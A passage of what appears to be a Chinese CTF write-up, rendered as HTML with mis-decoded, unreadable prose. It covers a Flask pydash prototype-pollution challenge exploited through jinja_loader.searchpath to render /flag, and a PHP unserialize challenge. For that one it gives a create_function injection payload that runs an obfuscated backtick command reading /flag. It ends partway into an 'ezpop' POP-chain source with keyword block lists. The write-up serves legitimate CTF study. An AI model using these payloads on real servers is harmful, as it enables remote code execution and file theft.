class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/name&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;username&#x27;</span>:user&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    old_password=request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">    new_password=request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">in</span> database <span class="keyword">and</span> database[user] == old_password:</span><br><span class="line">        database[user]=new_password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹æˆåŠŸï¼Œè¯·é‡æ–°ç™»å½•ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;å¯†ç ä¿®æ”¹å¤±è´¥ï¼Œè¯·ç¡®è®¤æ—§å¯†ç æ˜¯å¦æ­£ç¡®ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/user_dashboard&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="built_in">type</span>=request.form[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> database <span class="keyword">and</span> database[username] != password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯è¯·é‡æ–°è¾“å…¥ã€‚&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> name</span><br><span class="line">        name=username</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;user_dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;A272e1739b89da32e983970ece1a086bd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>å…³é”®éƒ¨åˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè‚¯å®šæ˜¯æ— æ³•ç›´æ¥sstiçš„ï¼Œäºæ˜¯è½¬å‘&#x2F;oprateï¼Œè¿™é‡Œå°±æ˜¯<code>pydash.set_</code>çš„ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“</p><p><a href="https://rycarl.cn/index.php/2025/05/08/pydash%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pydashä¸­çš„åŸå‹é“¾æ±¡æŸ“ - Rycarls little blog</a></p><p>ä½†æ˜¯<code>username in globals()</code>å¤´å­å¿…é¡»æ˜¯åœ¨è¿™ä¸ªé‡Œé¢ï¼Œ<code>globals()</code> æ˜¯ Python å†…ç½®çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒè¿”å›ä¸€ä¸ªè¡¨ç¤ºå½“å‰å…¨å±€ç¬¦å·è¡¨çš„å­—å…¸ï¼è¿™é‡Œå¯ä»¥æ˜¯appï¼Œä¸€å¼€æ˜¯æƒ³å»æ±¡æŸ“é™æ€ç›®å½•ï¼Œä½†æ˜¯<code>old</code>ä¸èƒ½ç”¨ï¼Œç„¶åæˆ‘ä»¬è¿™é‡Œå¯ä»¥å»æ±¡æŸ“é»˜è®¤æ¸²æŸ“è·¯å¾„</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</span><br><span class="line">/impression?point=flag</span><br></pre></td></tr></table></figure><p>å°±ç›´æ¥å»&#x2F;ä¸‹å»æ¸²æŸ“flagæ–‡ä»¶ï¼Œæ‹¿åˆ°flag</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>ç»™å‡ºæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">            <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">                <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯æ”¹ç¼–BUGKU-webçš„unserialize-Noteasyï¼ŒåŸºæœ¬ä¸Šå°±å¤šäº†äº›è¿‡æ»¤ã€‚</p><p>ä¸»è¦æ˜¯è¿™ä¸ªç©æ„$a(â€œâ€,$b);ä½ å¾—æ‰¾ä¸€ä¸ªå‡½æ•°æ¥å—ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç©ºçš„ï¼Œè¿™é‡Œåˆ©ç”¨create_functionçš„ç‰¹æ€§ï¼ˆ<a href="https://www.cnblogs.com/zzjdbk/p/12980483.html">PHPä»£ç å®¡è®¡ä¹‹create_function()å‡½æ•° - My_Dreams - åšå®¢å›­</a>ï¼‰</p><p>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå˜é‡å£°æ˜ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰§è¡Œä»£ç éƒ¨åˆ†ï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºå¹¶è°ƒç”¨äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼š</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é‡Œbå¯æ§çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é—­åˆé€ƒé€¸ï¼Œbçš„è¯ç”¨var_dump(<code>/bi?/?a? /?lag</code>);</p><p>expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&quot;create_function&quot;</span>,<span class="string">&quot;2;&#125;var_dump(`/bi?/?a? /?lag`);/*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span 